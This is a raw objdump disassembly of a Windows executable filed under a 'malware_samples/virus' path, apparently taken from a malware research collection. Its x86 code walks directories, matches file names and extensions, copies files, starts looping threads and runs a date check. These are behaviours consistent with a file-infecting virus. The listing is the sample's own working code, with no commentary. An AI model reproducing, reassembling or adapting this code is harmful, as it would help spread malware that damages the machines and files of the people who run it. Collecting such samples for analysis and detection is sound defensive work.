
malware_samples/virus/72fa7b77a1b8ec9959d1dc1c2c3e15e7fa4d94537a18d8c6babbbafdb9887664.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	e9 00 00 00 00       	jmp    0x401005
  401005:	68 a8 1c 00 00       	push   $0x1ca8
  40100a:	b9 b4 bf 40 00       	mov    $0x40bfb4,%ecx
  40100f:	e8 08 0e 00 00       	call   0x401e1c
  401014:	c3                   	ret
  401015:	51                   	push   %ecx
  401016:	53                   	push   %ebx
  401017:	55                   	push   %ebp
  401018:	56                   	push   %esi
  401019:	57                   	push   %edi
  40101a:	6a 0a                	push   $0xa
  40101c:	c7 05 b0 bf 40 00 09 	movl   $0x9,0x40bfb0
  401023:	00 00 00 
  401026:	e8 20 29 00 00       	call   0x40394b
  40102b:	c7 04 24 48 b0 40 00 	movl   $0x40b048,(%esp)
  401032:	50                   	push   %eax
  401033:	a3 a0 bf 40 00       	mov    %eax,0x40bfa0
  401038:	e8 a3 27 00 00       	call   0x4037e0
  40103d:	bf a8 bf 40 00       	mov    $0x40bfa8,%edi
  401042:	68 44 b0 40 00       	push   $0x40b044
  401047:	57                   	push   %edi
  401048:	e8 93 27 00 00       	call   0x4037e0
  40104d:	68 40 b0 40 00       	push   $0x40b040
  401052:	68 ac bf 40 00       	push   $0x40bfac
  401057:	e8 84 27 00 00       	call   0x4037e0
  40105c:	8b 44 24 30          	mov    0x30(%esp),%eax
  401060:	be 2c 01 00 00       	mov    $0x12c,%esi
  401065:	56                   	push   %esi
  401066:	a3 a4 bf 40 00       	mov    %eax,0x40bfa4
  40106b:	e8 db 28 00 00       	call   0x40394b
  401070:	56                   	push   %esi
  401071:	a3 c0 bf 40 00       	mov    %eax,0x40bfc0
  401076:	e8 d0 28 00 00       	call   0x40394b
  40107b:	56                   	push   %esi
  40107c:	a3 b8 bf 40 00       	mov    %eax,0x40bfb8
  401081:	e8 c5 28 00 00       	call   0x40394b
  401086:	56                   	push   %esi
  401087:	a3 bc bf 40 00       	mov    %eax,0x40bfbc
  40108c:	e8 ba 28 00 00       	call   0x40394b
  401091:	ff 35 b8 bf 40 00    	push   0x40bfb8
  401097:	a3 c4 bf 40 00       	mov    %eax,0x40bfc4
  40109c:	ff 35 c0 bf 40 00    	push   0x40bfc0
  4010a2:	e8 9d 0b 00 00       	call   0x401c44
  4010a7:	ff 35 c0 bf 40 00    	push   0x40bfc0
  4010ad:	e8 1e 28 00 00       	call   0x4038d0
  4010b2:	8b c8                	mov    %eax,%ecx
  4010b4:	a1 c0 bf 40 00       	mov    0x40bfc0,%eax
  4010b9:	83 c4 34             	add    $0x34,%esp
  4010bc:	33 db                	xor    %ebx,%ebx
  4010be:	80 7c 01 ff 22       	cmpb   $0x22,-0x1(%ecx,%eax,1)
  4010c3:	75 11                	jne    0x4010d6
  4010c5:	50                   	push   %eax
  4010c6:	e8 05 28 00 00       	call   0x4038d0
  4010cb:	59                   	pop    %ecx
  4010cc:	8b 0d c0 bf 40 00    	mov    0x40bfc0,%ecx
  4010d2:	88 5c 08 ff          	mov    %bl,-0x1(%eax,%ecx,1)
  4010d6:	ff 35 b8 bf 40 00    	push   0x40bfb8
  4010dc:	e8 ef 27 00 00       	call   0x4038d0
  4010e1:	59                   	pop    %ecx
  4010e2:	8b c8                	mov    %eax,%ecx
  4010e4:	a1 b8 bf 40 00       	mov    0x40bfb8,%eax
  4010e9:	80 7c 01 ff 22       	cmpb   $0x22,-0x1(%ecx,%eax,1)
  4010ee:	75 11                	jne    0x401101
  4010f0:	50                   	push   %eax
  4010f1:	e8 da 27 00 00       	call   0x4038d0
  4010f6:	59                   	pop    %ecx
  4010f7:	8b 0d b8 bf 40 00    	mov    0x40bfb8,%ecx
  4010fd:	88 5c 08 ff          	mov    %bl,-0x1(%eax,%ecx,1)
  401101:	56                   	push   %esi
  401102:	ff 35 bc bf 40 00    	push   0x40bfbc
  401108:	ff 15 20 90 40 00    	call   *0x409020
  40110e:	56                   	push   %esi
  40110f:	ff 35 c4 bf 40 00    	push   0x40bfc4
  401115:	ff 15 1c 90 40 00    	call   *0x40901c
  40111b:	68 e8 03 00 00       	push   $0x3e8
  401120:	e8 26 28 00 00       	call   0x40394b
  401125:	ff 35 c0 bf 40 00    	push   0x40bfc0
  40112b:	8b f0                	mov    %eax,%esi
  40112d:	56                   	push   %esi
  40112e:	e8 ad 26 00 00       	call   0x4037e0
  401133:	83 c4 0c             	add    $0xc,%esp
  401136:	57                   	push   %edi
  401137:	56                   	push   %esi
  401138:	e8 93 27 00 00       	call   0x4038d0
  40113d:	59                   	pop    %ecx
  40113e:	8d 44 30 fd          	lea    -0x3(%eax,%esi,1),%eax
  401142:	50                   	push   %eax
  401143:	e8 98 26 00 00       	call   0x4037e0
  401148:	56                   	push   %esi
  401149:	e8 82 27 00 00       	call   0x4038d0
  40114e:	03 05 b8 bf 40 00    	add    0x40bfb8,%eax
  401154:	50                   	push   %eax
  401155:	56                   	push   %esi
  401156:	e8 95 26 00 00       	call   0x4037f0
  40115b:	ff 35 c0 bf 40 00    	push   0x40bfc0
  401161:	e8 ce 05 00 00       	call   0x401734
  401166:	83 c4 18             	add    $0x18,%esp
  401169:	6a 01                	push   $0x1
  40116b:	56                   	push   %esi
  40116c:	ff 15 18 90 40 00    	call   *0x409018
  401172:	ff 35 a0 bf 40 00    	push   0x40bfa0
  401178:	6a 01                	push   $0x1
  40117a:	6a 01                	push   $0x1
  40117c:	53                   	push   %ebx
  40117d:	ff 15 14 90 40 00    	call   *0x409014
  401183:	8b 35 10 90 40 00    	mov    0x409010,%esi
  401189:	53                   	push   %ebx
  40118a:	50                   	push   %eax
  40118b:	ff d6                	call   *%esi
  40118d:	85 c0                	test   %eax,%eax
  40118f:	74 0a                	je     0x40119b
  401191:	5f                   	pop    %edi
  401192:	5e                   	pop    %esi
  401193:	5d                   	pop    %ebp
  401194:	33 c0                	xor    %eax,%eax
  401196:	5b                   	pop    %ebx
  401197:	59                   	pop    %ecx
  401198:	c2 10 00             	ret    $0x10
  40119b:	8d 44 24 10          	lea    0x10(%esp),%eax
  40119f:	50                   	push   %eax
  4011a0:	53                   	push   %ebx
  4011a1:	53                   	push   %ebx
  4011a2:	68 fb 15 40 00       	push   $0x4015fb
  4011a7:	68 00 10 00 00       	push   $0x1000
  4011ac:	53                   	push   %ebx
  4011ad:	ff 15 0c 90 40 00    	call   *0x40900c
  4011b3:	8b 2d 08 90 40 00    	mov    0x409008,%ebp
  4011b9:	8d 44 24 10          	lea    0x10(%esp),%eax
  4011bd:	50                   	push   %eax
  4011be:	53                   	push   %ebx
  4011bf:	53                   	push   %ebx
  4011c0:	68 09 17 40 00       	push   $0x401709
  4011c5:	68 00 04 00 00       	push   $0x400
  4011ca:	53                   	push   %ebx
  4011cb:	ff 15 0c 90 40 00    	call   *0x40900c
  4011d1:	8b f8                	mov    %eax,%edi
  4011d3:	53                   	push   %ebx
  4011d4:	57                   	push   %edi
  4011d5:	ff d6                	call   *%esi
  4011d7:	85 c0                	test   %eax,%eax
  4011d9:	74 de                	je     0x4011b9
  4011db:	6a 64                	push   $0x64
  4011dd:	ff d5                	call   *%ebp
  4011df:	57                   	push   %edi
  4011e0:	ff 15 04 90 40 00    	call   *0x409004
  4011e6:	68 84 03 00 00       	push   $0x384
  4011eb:	ff d5                	call   *%ebp
  4011ed:	57                   	push   %edi
  4011ee:	ff 15 00 90 40 00    	call   *0x409000
  4011f4:	eb dd                	jmp    0x4011d3
  4011f6:	56                   	push   %esi
  4011f7:	57                   	push   %edi
  4011f8:	68 40 01 00 00       	push   $0x140
  4011fd:	e8 49 27 00 00       	call   0x40394b
  401202:	8b 74 24 10          	mov    0x10(%esp),%esi
  401206:	c7 04 24 a8 bf 40 00 	movl   $0x40bfa8,(%esp)
  40120d:	56                   	push   %esi
  40120e:	8b f8                	mov    %eax,%edi
  401210:	e8 bb 26 00 00       	call   0x4038d0
  401215:	59                   	pop    %ecx
  401216:	8d 44 30 fd          	lea    -0x3(%eax,%esi,1),%eax
  40121a:	50                   	push   %eax
  40121b:	e8 c0 25 00 00       	call   0x4037e0
  401220:	59                   	pop    %ecx
  401221:	59                   	pop    %ecx
  401222:	57                   	push   %edi
  401223:	56                   	push   %esi
  401224:	ff 15 24 90 40 00    	call   *0x409024
  40122a:	57                   	push   %edi
  40122b:	8b f0                	mov    %eax,%esi
  40122d:	e8 27 27 00 00       	call   0x403959
  401232:	59                   	pop    %ecx
  401233:	83 fe ff             	cmp    $0xffffffff,%esi
  401236:	5f                   	pop    %edi
  401237:	5e                   	pop    %esi
  401238:	0f 95 c0             	setne  %al
  40123b:	c3                   	ret
  40123c:	83 ec 10             	sub    $0x10,%esp
  40123f:	53                   	push   %ebx
  401240:	55                   	push   %ebp
  401241:	56                   	push   %esi
  401242:	be f4 01 00 00       	mov    $0x1f4,%esi
  401247:	57                   	push   %edi
  401248:	56                   	push   %esi
  401249:	e8 fd 26 00 00       	call   0x40394b
  40124e:	8b d8                	mov    %eax,%ebx
  401250:	56                   	push   %esi
  401251:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  401255:	e8 f1 26 00 00       	call   0x40394b
  40125a:	56                   	push   %esi
  40125b:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40125f:	e8 e7 26 00 00       	call   0x40394b
  401264:	56                   	push   %esi
  401265:	8b f8                	mov    %eax,%edi
  401267:	e8 df 26 00 00       	call   0x40394b
  40126c:	ff 74 24 34          	push   0x34(%esp)
  401270:	8b f0                	mov    %eax,%esi
  401272:	89 74 24 30          	mov    %esi,0x30(%esp)
  401276:	53                   	push   %ebx
  401277:	e8 64 25 00 00       	call   0x4037e0
  40127c:	68 b0 b0 40 00       	push   $0x40b0b0
  401281:	53                   	push   %ebx
  401282:	e8 69 25 00 00       	call   0x4037f0
  401287:	68 40 01 00 00       	push   $0x140
  40128c:	e8 ba 26 00 00       	call   0x40394b
  401291:	ff 35 bc bf 40 00    	push   0x40bfbc
  401297:	8b e8                	mov    %eax,%ebp
  401299:	ff 74 24 4c          	push   0x4c(%esp)
  40129d:	e8 6e 6c 00 00       	call   0x407f10
  4012a2:	83 c4 2c             	add    $0x2c,%esp
  4012a5:	85 c0                	test   %eax,%eax
  4012a7:	0f 84 ca 02 00 00    	je     0x401577
  4012ad:	ff 35 c4 bf 40 00    	push   0x40bfc4
  4012b3:	ff 74 24 28          	push   0x28(%esp)
  4012b7:	e8 54 6c 00 00       	call   0x407f10
  4012bc:	59                   	pop    %ecx
  4012bd:	85 c0                	test   %eax,%eax
  4012bf:	59                   	pop    %ecx
  4012c0:	0f 84 b1 02 00 00    	je     0x401577
  4012c6:	8d 44 24 14          	lea    0x14(%esp),%eax
  4012ca:	68 a8 b0 40 00       	push   $0x40b0a8
  4012cf:	50                   	push   %eax
  4012d0:	c7 44 24 1c 07 00 00 	movl   $0x7,0x1c(%esp)
  4012d7:	00 
  4012d8:	ff 74 24 2c          	push   0x2c(%esp)
  4012dc:	e8 92 0a 00 00       	call   0x401d73
  4012e1:	59                   	pop    %ecx
  4012e2:	59                   	pop    %ecx
  4012e3:	50                   	push   %eax
  4012e4:	e8 27 6c 00 00       	call   0x407f10
  4012e9:	59                   	pop    %ecx
  4012ea:	85 c0                	test   %eax,%eax
  4012ec:	59                   	pop    %ecx
  4012ed:	0f 84 84 02 00 00    	je     0x401577
  4012f3:	8d 44 24 14          	lea    0x14(%esp),%eax
  4012f7:	68 9c b0 40 00       	push   $0x40b09c
  4012fc:	50                   	push   %eax
  4012fd:	c7 44 24 1c 08 00 00 	movl   $0x8,0x1c(%esp)
  401304:	00 
  401305:	ff 74 24 2c          	push   0x2c(%esp)
  401309:	e8 65 0a 00 00       	call   0x401d73
  40130e:	59                   	pop    %ecx
  40130f:	59                   	pop    %ecx
  401310:	50                   	push   %eax
  401311:	e8 fa 6b 00 00       	call   0x407f10
  401316:	59                   	pop    %ecx
  401317:	85 c0                	test   %eax,%eax
  401319:	59                   	pop    %ecx
  40131a:	0f 84 57 02 00 00    	je     0x401577
  401320:	8d 44 24 14          	lea    0x14(%esp),%eax
  401324:	68 94 b0 40 00       	push   $0x40b094
  401329:	50                   	push   %eax
  40132a:	c7 44 24 1c 06 00 00 	movl   $0x6,0x1c(%esp)
  401331:	00 
  401332:	ff 74 24 2c          	push   0x2c(%esp)
  401336:	e8 38 0a 00 00       	call   0x401d73
  40133b:	59                   	pop    %ecx
  40133c:	59                   	pop    %ecx
  40133d:	50                   	push   %eax
  40133e:	e8 cd 6b 00 00       	call   0x407f10
  401343:	59                   	pop    %ecx
  401344:	85 c0                	test   %eax,%eax
  401346:	59                   	pop    %ecx
  401347:	0f 84 2a 02 00 00    	je     0x401577
  40134d:	55                   	push   %ebp
  40134e:	53                   	push   %ebx
  40134f:	ff 15 24 90 40 00    	call   *0x409024
  401355:	83 f8 ff             	cmp    $0xffffffff,%eax
  401358:	89 44 24 14          	mov    %eax,0x14(%esp)
  40135c:	bb 90 b0 40 00       	mov    $0x40b090,%ebx
  401361:	0f 84 5f 01 00 00    	je     0x4014c6
  401367:	8d 45 2c             	lea    0x2c(%ebp),%eax
  40136a:	68 80 b0 40 00       	push   $0x40b080
  40136f:	50                   	push   %eax
  401370:	e8 9b 6b 00 00       	call   0x407f10
  401375:	59                   	pop    %ecx
  401376:	85 c0                	test   %eax,%eax
  401378:	59                   	pop    %ecx
  401379:	0f 84 2b 01 00 00    	je     0x4014aa
  40137f:	8d 45 2c             	lea    0x2c(%ebp),%eax
  401382:	68 74 b0 40 00       	push   $0x40b074
  401387:	50                   	push   %eax
  401388:	e8 83 6b 00 00       	call   0x407f10
  40138d:	59                   	pop    %ecx
  40138e:	85 c0                	test   %eax,%eax
  401390:	59                   	pop    %ecx
  401391:	0f 84 13 01 00 00    	je     0x4014aa
  401397:	8d 45 2c             	lea    0x2c(%ebp),%eax
  40139a:	68 64 b0 40 00       	push   $0x40b064
  40139f:	50                   	push   %eax
  4013a0:	e8 6b 6b 00 00       	call   0x407f10
  4013a5:	59                   	pop    %ecx
  4013a6:	85 c0                	test   %eax,%eax
  4013a8:	59                   	pop    %ecx
  4013a9:	0f 84 fb 00 00 00    	je     0x4014aa
  4013af:	ff 74 24 24          	push   0x24(%esp)
  4013b3:	57                   	push   %edi
  4013b4:	e8 27 24 00 00       	call   0x4037e0
  4013b9:	53                   	push   %ebx
  4013ba:	57                   	push   %edi
  4013bb:	e8 30 24 00 00       	call   0x4037f0
  4013c0:	8d 45 2c             	lea    0x2c(%ebp),%eax
  4013c3:	50                   	push   %eax
  4013c4:	57                   	push   %edi
  4013c5:	e8 26 24 00 00       	call   0x4037f0
  4013ca:	57                   	push   %edi
  4013cb:	56                   	push   %esi
  4013cc:	e8 0f 24 00 00       	call   0x4037e0
  4013d1:	83 c4 20             	add    $0x20,%esp
  4013d4:	68 a8 bf 40 00       	push   $0x40bfa8
  4013d9:	56                   	push   %esi
  4013da:	e8 f1 24 00 00       	call   0x4038d0
  4013df:	59                   	pop    %ecx
  4013e0:	8d 44 30 fd          	lea    -0x3(%eax,%esi,1),%eax
  4013e4:	50                   	push   %eax
  4013e5:	e8 f6 23 00 00       	call   0x4037e0
  4013ea:	56                   	push   %esi
  4013eb:	e8 06 fe ff ff       	call   0x4011f6
  4013f0:	83 c4 0c             	add    $0xc,%esp
  4013f3:	84 c0                	test   %al,%al
  4013f5:	74 07                	je     0x4013fe
  4013f7:	56                   	push   %esi
  4013f8:	e8 30 08 00 00       	call   0x401c2d
  4013fd:	59                   	pop    %ecx
  4013fe:	57                   	push   %edi
  4013ff:	e8 a9 04 00 00       	call   0x4018ad
  401404:	84 c0                	test   %al,%al
  401406:	59                   	pop    %ecx
  401407:	0f 85 9d 00 00 00    	jne    0x4014aa
  40140d:	57                   	push   %edi
  40140e:	b9 b4 bf 40 00       	mov    $0x40bfb4,%ecx
  401413:	e8 0f 0a 00 00       	call   0x401e27
  401418:	84 c0                	test   %al,%al
  40141a:	0f 84 8a 00 00 00    	je     0x4014aa
  401420:	ff 35 c4 bf 40 00    	push   0x40bfc4
  401426:	e8 a5 24 00 00       	call   0x4038d0
  40142b:	8b 0d b0 bf 40 00    	mov    0x40bfb0,%ecx
  401431:	8d 44 08 0a          	lea    0xa(%eax,%ecx,1),%eax
  401435:	50                   	push   %eax
  401436:	e8 10 25 00 00       	call   0x40394b
  40143b:	ff 35 c4 bf 40 00    	push   0x40bfc4
  401441:	8b f0                	mov    %eax,%esi
  401443:	56                   	push   %esi
  401444:	e8 97 23 00 00       	call   0x4037e0
  401449:	53                   	push   %ebx
  40144a:	56                   	push   %esi
  40144b:	e8 a0 23 00 00       	call   0x4037f0
  401450:	ff 35 a0 bf 40 00    	push   0x40bfa0
  401456:	56                   	push   %esi
  401457:	e8 94 23 00 00       	call   0x4037f0
  40145c:	68 60 b0 40 00       	push   $0x40b060
  401461:	56                   	push   %esi
  401462:	e8 89 23 00 00       	call   0x4037f0
  401467:	68 ac bf 40 00       	push   $0x40bfac
  40146c:	56                   	push   %esi
  40146d:	e8 7e 23 00 00       	call   0x4037f0
  401472:	83 c4 30             	add    $0x30,%esp
  401475:	6a 00                	push   $0x0
  401477:	56                   	push   %esi
  401478:	ff 35 c0 bf 40 00    	push   0x40bfc0
  40147e:	ff 15 30 90 40 00    	call   *0x409030
  401484:	56                   	push   %esi
  401485:	57                   	push   %edi
  401486:	b9 b4 bf 40 00       	mov    $0x40bfb4,%ecx
  40148b:	e8 85 0e 00 00       	call   0x402315
  401490:	57                   	push   %edi
  401491:	56                   	push   %esi
  401492:	e8 86 05 00 00       	call   0x401a1d
  401497:	56                   	push   %esi
  401498:	e8 90 07 00 00       	call   0x401c2d
  40149d:	56                   	push   %esi
  40149e:	e8 b6 24 00 00       	call   0x403959
  4014a3:	8b 74 24 2c          	mov    0x2c(%esp),%esi
  4014a7:	83 c4 10             	add    $0x10,%esp
  4014aa:	55                   	push   %ebp
  4014ab:	ff 74 24 18          	push   0x18(%esp)
  4014af:	ff 15 2c 90 40 00    	call   *0x40902c
  4014b5:	85 c0                	test   %eax,%eax
  4014b7:	74 0d                	je     0x4014c6
  4014b9:	68 80 b0 40 00       	push   $0x40b080
  4014be:	8d 45 2c             	lea    0x2c(%ebp),%eax
  4014c1:	e9 a9 fe ff ff       	jmp    0x40136f
  4014c6:	ff 74 24 14          	push   0x14(%esp)
  4014ca:	ff 15 28 90 40 00    	call   *0x409028
  4014d0:	ff 74 24 24          	push   0x24(%esp)
  4014d4:	ff 74 24 1c          	push   0x1c(%esp)
  4014d8:	e8 03 23 00 00       	call   0x4037e0
  4014dd:	68 58 b0 40 00       	push   $0x40b058
  4014e2:	ff 74 24 24          	push   0x24(%esp)
  4014e6:	e8 05 23 00 00       	call   0x4037f0
  4014eb:	83 c4 10             	add    $0x10,%esp
  4014ee:	55                   	push   %ebp
  4014ef:	ff 74 24 1c          	push   0x1c(%esp)
  4014f3:	ff 15 24 90 40 00    	call   *0x409024
  4014f9:	89 44 24 14          	mov    %eax,0x14(%esp)
  4014fd:	83 f8 ff             	cmp    $0xffffffff,%eax
  401500:	74 71                	je     0x401573
  401502:	8b 45 00             	mov    0x0(%ebp),%eax
  401505:	83 e0 10             	and    $0x10,%eax
  401508:	3c 10                	cmp    $0x10,%al
  40150a:	75 58                	jne    0x401564
  40150c:	8d 45 2c             	lea    0x2c(%ebp),%eax
  40150f:	68 60 b0 40 00       	push   $0x40b060
  401514:	50                   	push   %eax
  401515:	e8 f6 69 00 00       	call   0x407f10
  40151a:	59                   	pop    %ecx
  40151b:	85 c0                	test   %eax,%eax
  40151d:	59                   	pop    %ecx
  40151e:	74 44                	je     0x401564
  401520:	8d 45 2c             	lea    0x2c(%ebp),%eax
  401523:	68 54 b0 40 00       	push   $0x40b054
  401528:	50                   	push   %eax
  401529:	e8 e2 69 00 00       	call   0x407f10
  40152e:	59                   	pop    %ecx
  40152f:	85 c0                	test   %eax,%eax
  401531:	59                   	pop    %ecx
  401532:	74 30                	je     0x401564
  401534:	ff 74 24 24          	push   0x24(%esp)
  401538:	ff 74 24 14          	push   0x14(%esp)
  40153c:	e8 9f 22 00 00       	call   0x4037e0
  401541:	53                   	push   %ebx
  401542:	ff 74 24 1c          	push   0x1c(%esp)
  401546:	e8 a5 22 00 00       	call   0x4037f0
  40154b:	8d 45 2c             	lea    0x2c(%ebp),%eax
  40154e:	50                   	push   %eax
  40154f:	ff 74 24 24          	push   0x24(%esp)
  401553:	e8 98 22 00 00       	call   0x4037f0
  401558:	ff 74 24 28          	push   0x28(%esp)
  40155c:	e8 db fc ff ff       	call   0x40123c
  401561:	83 c4 1c             	add    $0x1c,%esp
  401564:	55                   	push   %ebp
  401565:	ff 74 24 18          	push   0x18(%esp)
  401569:	ff 15 2c 90 40 00    	call   *0x40902c
  40156f:	85 c0                	test   %eax,%eax
  401571:	eb 8d                	jmp    0x401500
  401573:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  401577:	53                   	push   %ebx
  401578:	e8 dc 23 00 00       	call   0x403959
  40157d:	ff 74 24 14          	push   0x14(%esp)
  401581:	e8 d3 23 00 00       	call   0x403959
  401586:	57                   	push   %edi
  401587:	e8 cd 23 00 00       	call   0x403959
  40158c:	56                   	push   %esi
  40158d:	e8 c7 23 00 00       	call   0x403959
  401592:	55                   	push   %ebp
  401593:	e8 c1 23 00 00       	call   0x403959
  401598:	83 c4 14             	add    $0x14,%esp
  40159b:	5f                   	pop    %edi
  40159c:	5e                   	pop    %esi
  40159d:	5d                   	pop    %ebp
  40159e:	5b                   	pop    %ebx
  40159f:	83 c4 10             	add    $0x10,%esp
  4015a2:	c3                   	ret
  4015a3:	55                   	push   %ebp
  4015a4:	8b ec                	mov    %esp,%ebp
  4015a6:	83 ec 10             	sub    $0x10,%esp
  4015a9:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4015ac:	50                   	push   %eax
  4015ad:	ff 15 34 90 40 00    	call   *0x409034
  4015b3:	0f b7 45 f6          	movzwl -0xa(%ebp),%eax
  4015b7:	c9                   	leave
  4015b8:	c3                   	ret
  4015b9:	55                   	push   %ebp
  4015ba:	8b ec                	mov    %esp,%ebp
  4015bc:	83 ec 10             	sub    $0x10,%esp
  4015bf:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4015c2:	50                   	push   %eax
  4015c3:	ff 15 34 90 40 00    	call   *0x409034
  4015c9:	0f b7 45 f0          	movzwl -0x10(%ebp),%eax
  4015cd:	c9                   	leave
  4015ce:	c3                   	ret
  4015cf:	55                   	push   %ebp
  4015d0:	8b ec                	mov    %esp,%ebp
  4015d2:	83 ec 10             	sub    $0x10,%esp
  4015d5:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4015d8:	50                   	push   %eax
  4015d9:	ff 15 34 90 40 00    	call   *0x409034
  4015df:	0f b7 45 f2          	movzwl -0xe(%ebp),%eax
  4015e3:	c9                   	leave
  4015e4:	c3                   	ret
  4015e5:	55                   	push   %ebp
  4015e6:	8b ec                	mov    %esp,%ebp
  4015e8:	83 ec 10             	sub    $0x10,%esp
  4015eb:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4015ee:	50                   	push   %eax
  4015ef:	ff 15 34 90 40 00    	call   *0x409034
  4015f5:	0f b7 45 f4          	movzwl -0xc(%ebp),%eax
  4015f9:	c9                   	leave
  4015fa:	c3                   	ret
  4015fb:	e8 0d 00 00 00       	call   0x40160d
  401600:	68 d0 07 00 00       	push   $0x7d0
  401605:	ff 15 08 90 40 00    	call   *0x409008
  40160b:	eb ee                	jmp    0x4015fb
  40160d:	56                   	push   %esi
  40160e:	57                   	push   %edi
  40160f:	6a 01                	push   $0x1
  401611:	e8 35 23 00 00       	call   0x40394b
  401616:	59                   	pop    %ecx
  401617:	8b f0                	mov    %eax,%esi
  401619:	8b ce                	mov    %esi,%ecx
  40161b:	e8 99 ff ff ff       	call   0x4015b9
  401620:	bf d4 07 00 00       	mov    $0x7d4,%edi
  401625:	3b c7                	cmp    %edi,%eax
  401627:	7f 1f                	jg     0x401648
  401629:	8b ce                	mov    %esi,%ecx
  40162b:	e8 89 ff ff ff       	call   0x4015b9
  401630:	3b c7                	cmp    %edi,%eax
  401632:	0f 85 ce 00 00 00    	jne    0x401706
  401638:	8b ce                	mov    %esi,%ecx
  40163a:	e8 90 ff ff ff       	call   0x4015cf
  40163f:	83 f8 01             	cmp    $0x1,%eax
  401642:	0f 8e be 00 00 00    	jle    0x401706
  401648:	8b ce                	mov    %esi,%ecx
  40164a:	e8 96 ff ff ff       	call   0x4015e5
  40164f:	83 f8 05             	cmp    $0x5,%eax
  401652:	0f 84 90 00 00 00    	je     0x4016e8
  401658:	8b ce                	mov    %esi,%ecx
  40165a:	e8 44 ff ff ff       	call   0x4015a3
  40165f:	83 f8 06             	cmp    $0x6,%eax
  401662:	75 0c                	jne    0x401670
  401664:	8b ce                	mov    %esi,%ecx
  401666:	e8 64 ff ff ff       	call   0x4015cf
  40166b:	83 f8 0a             	cmp    $0xa,%eax
  40166e:	74 78                	je     0x4016e8
  401670:	8b ce                	mov    %esi,%ecx
  401672:	e8 2c ff ff ff       	call   0x4015a3
  401677:	83 f8 1a             	cmp    $0x1a,%eax
  40167a:	75 0c                	jne    0x401688
  40167c:	8b ce                	mov    %esi,%ecx
  40167e:	e8 4c ff ff ff       	call   0x4015cf
  401683:	83 f8 0a             	cmp    $0xa,%eax
  401686:	74 60                	je     0x4016e8
  401688:	8b ce                	mov    %esi,%ecx
  40168a:	e8 14 ff ff ff       	call   0x4015a3
  40168f:	83 f8 19             	cmp    $0x19,%eax
  401692:	75 0c                	jne    0x4016a0
  401694:	8b ce                	mov    %esi,%ecx
  401696:	e8 34 ff ff ff       	call   0x4015cf
  40169b:	83 f8 0b             	cmp    $0xb,%eax
  40169e:	74 48                	je     0x4016e8
  4016a0:	8b ce                	mov    %esi,%ecx
  4016a2:	e8 fc fe ff ff       	call   0x4015a3
  4016a7:	83 f8 01             	cmp    $0x1,%eax
  4016aa:	75 0c                	jne    0x4016b8
  4016ac:	8b ce                	mov    %esi,%ecx
  4016ae:	e8 1c ff ff ff       	call   0x4015cf
  4016b3:	83 f8 01             	cmp    $0x1,%eax
  4016b6:	74 30                	je     0x4016e8
  4016b8:	8b ce                	mov    %esi,%ecx
  4016ba:	e8 e4 fe ff ff       	call   0x4015a3
  4016bf:	83 f8 17             	cmp    $0x17,%eax
  4016c2:	75 0c                	jne    0x4016d0
  4016c4:	8b ce                	mov    %esi,%ecx
  4016c6:	e8 04 ff ff ff       	call   0x4015cf
  4016cb:	83 f8 07             	cmp    $0x7,%eax
  4016ce:	74 18                	je     0x4016e8
  4016d0:	8b ce                	mov    %esi,%ecx
  4016d2:	e8 cc fe ff ff       	call   0x4015a3
  4016d7:	83 f8 15             	cmp    $0x15,%eax
  4016da:	75 23                	jne    0x4016ff
  4016dc:	8b ce                	mov    %esi,%ecx
  4016de:	e8 ec fe ff ff       	call   0x4015cf
  4016e3:	83 f8 03             	cmp    $0x3,%eax
  4016e6:	75 17                	jne    0x4016ff
  4016e8:	6a 00                	push   $0x0
  4016ea:	68 2f 1d 40 00       	push   $0x401d2f
  4016ef:	6a 00                	push   $0x0
  4016f1:	6a 67                	push   $0x67
  4016f3:	ff 35 a4 bf 40 00    	push   0x40bfa4
  4016f9:	ff 15 10 91 40 00    	call   *0x409110
  4016ff:	56                   	push   %esi
  401700:	e8 54 22 00 00       	call   0x403959
  401705:	59                   	pop    %ecx
  401706:	5f                   	pop    %edi
  401707:	5e                   	pop    %esi
  401708:	c3                   	ret
  401709:	55                   	push   %ebp
  40170a:	8b ec                	mov    %esp,%ebp
  40170c:	51                   	push   %ecx
  40170d:	56                   	push   %esi
  40170e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401711:	68 b8 b0 40 00       	push   $0x40b0b8
  401716:	50                   	push   %eax
  401717:	e8 c4 20 00 00       	call   0x4037e0
  40171c:	59                   	pop    %ecx
  40171d:	59                   	pop    %ecx
  40171e:	6a 14                	push   $0x14
  401720:	5e                   	pop    %esi
  401721:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401724:	50                   	push   %eax
  401725:	e8 12 fb ff ff       	call   0x40123c
  40172a:	fe 45 fc             	incb   -0x4(%ebp)
  40172d:	4e                   	dec    %esi
  40172e:	59                   	pop    %ecx
  40172f:	75 f0                	jne    0x401721
  401731:	5e                   	pop    %esi
  401732:	c9                   	leave
  401733:	c3                   	ret
  401734:	b8 7c 80 40 00       	mov    $0x40807c,%eax
  401739:	e8 fa 25 00 00       	call   0x403d38
  40173e:	83 ec 0c             	sub    $0xc,%esp
  401741:	53                   	push   %ebx
  401742:	8b 5d 08             	mov    0x8(%ebp),%ebx
  401745:	53                   	push   %ebx
  401746:	e8 62 01 00 00       	call   0x4018ad
  40174b:	84 c0                	test   %al,%al
  40174d:	59                   	pop    %ecx
  40174e:	0f 84 4c 01 00 00    	je     0x4018a0
  401754:	57                   	push   %edi
  401755:	53                   	push   %ebx
  401756:	e8 75 21 00 00       	call   0x4038d0
  40175b:	40                   	inc    %eax
  40175c:	50                   	push   %eax
  40175d:	e8 e9 21 00 00       	call   0x40394b
  401762:	8b f8                	mov    %eax,%edi
  401764:	53                   	push   %ebx
  401765:	57                   	push   %edi
  401766:	89 7d ec             	mov    %edi,-0x14(%ebp)
  401769:	e8 72 20 00 00       	call   0x4037e0
  40176e:	83 c4 10             	add    $0x10,%esp
  401771:	68 a8 bf 40 00       	push   $0x40bfa8
  401776:	57                   	push   %edi
  401777:	e8 54 21 00 00       	call   0x4038d0
  40177c:	59                   	pop    %ecx
  40177d:	8d 44 38 fd          	lea    -0x3(%eax,%edi,1),%eax
  401781:	50                   	push   %eax
